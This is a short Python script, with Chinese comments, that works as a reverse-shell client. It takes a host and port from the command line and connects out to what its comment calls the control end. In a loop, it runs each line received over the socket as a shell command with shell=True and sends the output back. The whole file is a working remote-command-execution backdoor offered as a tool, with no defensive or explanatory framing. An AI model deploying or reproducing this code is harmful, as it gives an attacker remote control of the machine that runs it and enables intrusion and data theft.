#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import argparse
import sys
import time
import threading

def connectHost(ht,pt):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ht,int(pt)))
    while True:
        data = sock.recv(1024)
        data = data.decode('utf-8')
        comRst = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        m_stdout, m_stderr = comRst.communicate()
        sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8'))
        time.sleep(1)
    sock.close()


def main():
    parser = argparse.ArgumentParser()  #命令行参数解析对象
    parser.add_argument('-H',dest='hostName',help='Host Name')
    parser.add_argument('-p',dest='conPort',help='Host Port')

    args = parser.parse_args()          #解析命令行参数
    host = args.hostName
    port = args.conPort

    if host == None and port == None:
        print(parser.parse_args(['-h']))
        exit(0)

    connectHost(host,port)              #连接到控制端


if __name__ == '__main__':
    main()
